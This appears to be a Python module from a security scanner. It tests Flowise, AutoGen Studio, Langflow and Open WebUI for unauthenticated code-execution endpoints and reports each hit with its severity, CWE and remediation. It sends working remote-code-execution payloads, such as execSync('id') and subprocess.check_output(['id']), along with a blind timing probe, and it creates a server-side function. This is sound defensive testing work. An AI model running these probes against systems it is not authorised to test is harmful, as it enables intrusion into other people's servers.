"""ASI05 — Unexpected Code Execution: eval/exec sinks in agentic platforms."""
from __future__ import annotations

import time

from .base import BaseModule
from ..core.models import AgentSurface, Finding, OWASPCategory, Severity
from ..platforms.base import BasePlatform


def _is_api_response(r) -> bool:
    """Return False if response is HTML (SPA catch-all), True for JSON/API responses."""
    try:
        ct = r.headers.get("content-type", "")
        if isinstance(ct, str):
            return "text/html" not in ct
    except Exception:
        pass
    return True

# Flowise: node-load-method can execute arbitrary JS code
_FLOWISE_CODE_ENDPOINTS = [
    "/api/v1/node-load-method/jsFunctionNode",
    "/api/v1/node-load-method/ifElseFunction",
    "/api/v1/node-load-method/customFunction",
]

# Active OS command payloads for Flowise (JS)
_JS_OS_PROBE   = {"code": "return require('os').platform()"}
_JS_CMD_PROBE  = {"code": "return require('child_process').execSync('id').toString()"}
# Blind timing probe: if this takes >250ms extra, code executed even without output
_JS_TIMING_PROBE = {"code": "return new Promise(r => setTimeout(() => r(42), 300))"}

_OS_INDICATORS  = ["linux", "darwin", "win32", "freebsd"]
_CMD_INDICATORS = ["uid=", "root", "daemon"]

# AutoGen Studio — FunctionTool endpoint (Shrike-confirmed RCE pattern)
_AUTOGEN_EXEC_ENDPOINTS = [
    "/api/tools/execute",
    "/api/v1/tools/execute",
]
_AUTOGEN_OS_PAYLOAD  = {"source_code": "import os; print(os.getcwd())", "name": "_probe_"}
_AUTOGEN_CMD_PAYLOAD = {
    "source_code": "import subprocess; print(subprocess.check_output(['id']).decode())",
    "name": "_probe_cmd_",
}
_PATH_INDICATORS = ["/", "\\", "home", "root", "tmp", "app", "C:"]

# Langflow — custom component execution
_LANGFLOW_EXEC_ENDPOINTS = [
    "/api/v1/custom_component",
    "/api/v1/run/code",
]
_LANGFLOW_PROBE     = {"code": "print('condor')", "frontend_node": {}}
_LANGFLOW_CMD_PROBE = {
    "code": "import subprocess; print(subprocess.check_output(['id']).decode())",
    "frontend_node": {},
}

# Open WebUI — Python function creation (filter/action type, executed on chat events)
_OWI_FUNCTION_ENDPOINT = "/api/v1/functions"
_OWI_FUNCTION_PAYLOAD  = {
    "name": "condor-probe",
    "content": "def filter(body, __user__=None):\n    print('condor')\n    return body",
    "type": "filter",
}


class CodeExecutionModule(BaseModule):
    name        = "code-execution"
    owasp_id    = OWASPCategory.ASI05
    description = "Detects eval/exec sinks and unauthenticated code execution endpoints (ASI05)"

    async def _check_owui_functions(self, platform: BasePlatform) -> list[Finding]:
        """Probe Open WebUI function creation endpoint — Python filter/action execution without auth."""
        findings: list[Finding] = []
        created_id: str | None = None
        try:
            r = await platform.post(_OWI_FUNCTION_ENDPOINT, json=_OWI_FUNCTION_PAYLOAD)
            if r.status_code in (401, 403, 404):
                return findings
            if not _is_api_response(r):
                return findings
            if r.status_code in (200, 201):
                try:
                    data = r.json()
                    created_id = data.get("id") if isinstance(data, dict) else None
                except Exception:
                    pass
                findings.append(Finding(
                    title="Unauthenticated Python function creation accepted: /api/v1/functions",
                    severity=Severity.CRITICAL,
                    owasp_id=self.owasp_id,
                    description=(
                        "Open WebUI's /api/v1/functions endpoint accepted a Python function "
                        "creation request without authentication. Filter and action functions "
                        "are executed server-side on chat events, enabling persistent RCE via "
                        "any authenticated chat interaction."
                    ),
                    evidence=f"POST {_OWI_FUNCTION_ENDPOINT} → {r.status_code} (function created without auth)",
                    remediation=(
                        "Enable Open WebUI authentication (WEBUI_AUTH=True, which is the default). "
                        "Restrict /api/v1/functions to admin users only."
                    ),
                    confidence=95,
                    cwe_id="CWE-306",
                    endpoint=_OWI_FUNCTION_ENDPOINT,
                ))
            elif r.status_code in (400, 422):
                findings.append(Finding(
                    title="Open WebUI function endpoint accessible without authentication",
                    severity=Severity.HIGH,
                    owasp_id=self.owasp_id,
                    description=(
                        "Open WebUI's /api/v1/functions endpoint responded to an unauthenticated "
                        f"POST request (HTTP {r.status_code}). The endpoint allows Python code "
                        "upload; a correctly formatted payload may achieve persistent RCE."
                    ),
                    evidence=f"POST {_OWI_FUNCTION_ENDPOINT} → {r.status_code} (auth not enforced, payload rejected)",
                    remediation="Enable Open WebUI authentication. Restrict function endpoints to admin users.",
                    confidence=70,
                    cwe_id="CWE-306",
                    endpoint=_OWI_FUNCTION_ENDPOINT,
                ))
        except Exception:
            pass
        finally:
            if created_id:
                try:
                    await platform.delete(f"{_OWI_FUNCTION_ENDPOINT}/{created_id}")
                except Exception:
                    pass
        return findings

    async def run(self, surface: AgentSurface, platform: BasePlatform) -> list[Finding]:
        findings: list[Finding] = []

        # Flowise: node-load-method JS execution
        for endpoint in _FLOWISE_CODE_ENDPOINTS:
            try:
                # Try active OS command first
                r = await platform.post(endpoint, json=_JS_CMD_PROBE)
                if r.status_code == 200 and _is_api_response(r):
                    body = r.text
                    cmd_confirmed = any(ind in body for ind in _CMD_INDICATORS)
                    os_confirmed  = any(ind in body.lower() for ind in _OS_INDICATORS)
                    if cmd_confirmed or os_confirmed:
                        findings.append(Finding(
                            title=f"Remote code execution confirmed via {endpoint}",
                            severity=Severity.CRITICAL,
                            owasp_id=self.owasp_id,
                            description=(
                                f"The Flowise endpoint {endpoint} executes arbitrary JavaScript "
                                f"and returned OS command output without authentication."
                            ),
                            evidence=(
                                f"POST {endpoint} with child_process.execSync payload → "
                                f"command output in response: {body[:200]}"
                            ),
                            remediation=(
                                "Enable Flowise authentication (FLOWISE_USERNAME + FLOWISE_PASSWORD). "
                                "Restrict the node-load-method endpoint to authenticated users only."
                            ),
                            confidence=98,
                            cwe_id="CWE-78",
                            endpoint=endpoint,
                        ))
                        continue

                # Fall back to os.platform() probe — only report if output reflected
                r = await platform.post(endpoint, json=_JS_OS_PROBE)
                if r.status_code == 200 and _is_api_response(r):
                    body = r.text
                    confirmed = any(ind in body.lower() for ind in _OS_INDICATORS)
                    if confirmed:
                        findings.append(Finding(
                            title=f"Unauthenticated code execution via {endpoint}",
                            severity=Severity.CRITICAL,
                            owasp_id=self.owasp_id,
                            description=(
                                f"The Flowise endpoint {endpoint} executes arbitrary JavaScript "
                                f"without authentication. An attacker can achieve full server-side "
                                f"code execution, read files, execute system commands, or pivot "
                                f"to internal services."
                            ),
                            evidence=f"POST {endpoint} with JS payload → 200 OK. OS info in response: {body[:200]}",
                            remediation=(
                                "Enable Flowise authentication (FLOWISE_USERNAME + FLOWISE_PASSWORD). "
                                "Restrict the node-load-method endpoint to authenticated users only."
                            ),
                            confidence=95,
                            cwe_id="CWE-77",
                            endpoint=endpoint,
                        ))
                        continue

                # Blind timing probe — warm up first to isolate network latency
                await platform.post(endpoint, json=_JS_OS_PROBE)
                t0 = time.monotonic()
                r = await platform.post(endpoint, json=_JS_TIMING_PROBE)
                elapsed = time.monotonic() - t0
                # Require 250ms above baseline; use 0.5s threshold to avoid false positives
                # from cold TCP connections or server-side scheduling jitter
                if r.status_code == 200 and _is_api_response(r) and elapsed >= 0.5:
                    findings.append(Finding(
                        title=f"Potential blind code execution via timing side-channel: {endpoint}",
                        severity=Severity.HIGH,
                        owasp_id=self.owasp_id,
                        description=(
                            f"The Flowise endpoint {endpoint} accepted a timed async payload "
                            f"and responded after the expected delay ({elapsed:.2f}s), "
                            f"suggesting code executed even though output was not reflected."
                        ),
                        evidence=f"POST {endpoint} with 300ms setTimeout probe → response in {elapsed:.2f}s",
                        remediation="Enable Flowise authentication. Restrict code execution endpoints.",
                        confidence=50,
                        cwe_id="CWE-77",
                        endpoint=endpoint,
                    ))

            except Exception:
                pass

        # AutoGen Studio: tools/execute endpoint (Shrike-confirmed RCE pattern)
        for endpoint in _AUTOGEN_EXEC_ENDPOINTS:
            try:
                # Try active OS command first
                r = await platform.post(endpoint, json=_AUTOGEN_CMD_PAYLOAD)
                if r.status_code in (200, 201) and _is_api_response(r):
                    body = r.text
                    cmd_confirmed = any(ind in body for ind in _CMD_INDICATORS)
                    if cmd_confirmed:
                        findings.append(Finding(
                            title=f"Remote code execution confirmed via {endpoint}",
                            severity=Severity.CRITICAL,
                            owasp_id=self.owasp_id,
                            description=(
                                f"The AutoGen Studio endpoint {endpoint} executed a subprocess "
                                f"command and returned its output without authentication."
                            ),
                            evidence=f"POST {endpoint} with subprocess payload → command output: {body[:200]}",
                            remediation="Enable AutoGen Studio authentication and sandbox code execution.",
                            confidence=98,
                            cwe_id="CWE-78",
                            endpoint=endpoint,
                        ))
                        continue

                # Fall back to os.getcwd() probe
                r = await platform.post(endpoint, json=_AUTOGEN_OS_PAYLOAD)
                if r.status_code in (200, 201) and _is_api_response(r):
                    body = r.text
                    path_confirmed = any(ind in body for ind in _PATH_INDICATORS)
                    findings.append(Finding(
                        title=f"Unauthenticated Python execution via {endpoint}",
                        severity=Severity.CRITICAL,
                        owasp_id=self.owasp_id,
                        description=(
                            f"The AutoGen Studio endpoint {endpoint} accepts Python source code "
                            f"and executes it via exec() without authentication. "
                            f"This allows full server-side code execution."
                        ),
                        evidence=(
                            f"POST {endpoint} with Python payload → {r.status_code}. "
                            + (f"Path in response: {body[:200]}" if path_confirmed else "Endpoint accepted payload.")
                        ),
                        remediation="Enable AutoGen Studio authentication and sandbox code execution.",
                        confidence=95 if path_confirmed else 90,
                        cwe_id="CWE-94",
                        endpoint=endpoint,
                    ))
            except Exception:
                pass

        # Langflow: custom component execution
        for endpoint in _LANGFLOW_EXEC_ENDPOINTS:
            try:
                # Try active OS command first
                r = await platform.post(endpoint, json=_LANGFLOW_CMD_PROBE)
                if r.status_code in (200, 201) and _is_api_response(r):
                    body = r.text
                    cmd_confirmed = any(ind in body for ind in _CMD_INDICATORS)
                    if cmd_confirmed:
                        findings.append(Finding(
                            title=f"Remote code execution confirmed via {endpoint}",
                            severity=Severity.CRITICAL,
                            owasp_id=self.owasp_id,
                            description=(
                                f"The Langflow endpoint {endpoint} executed a subprocess command "
                                f"and returned its output without authentication."
                            ),
                            evidence=f"POST {endpoint} with subprocess payload → command output: {body[:200]}",
                            remediation="Restrict custom component endpoints to authenticated users.",
                            confidence=98,
                            cwe_id="CWE-78",
                            endpoint=endpoint,
                        ))
                        continue

                # Fall back to print('condor') probe
                r = await platform.post(endpoint, json=_LANGFLOW_PROBE)
                if r.status_code in (200, 201) and _is_api_response(r):
                    body = r.text
                    output_confirmed = "condor" in body.lower()
                    findings.append(Finding(
                        title=f"Code execution endpoint reachable: {endpoint}",
                        severity=Severity.HIGH,
                        owasp_id=self.owasp_id,
                        description=(
                            f"The Langflow endpoint {endpoint} is accessible and may allow "
                            f"arbitrary Python execution."
                            + (" Probe output confirmed in response." if output_confirmed else " Requires further manual verification.")
                        ),
                        evidence=f"POST {endpoint} → {r.status_code}" + (f", 'condor' in response" if output_confirmed else ""),
                        remediation="Restrict custom component endpoints to authenticated users.",
                        confidence=85 if output_confirmed else 65,
                        cwe_id="CWE-94",
                        endpoint=endpoint,
                    ))
            except Exception:
                pass

        # Open WebUI: Python function creation endpoint
        findings.extend(await self._check_owui_functions(platform))

        return findings
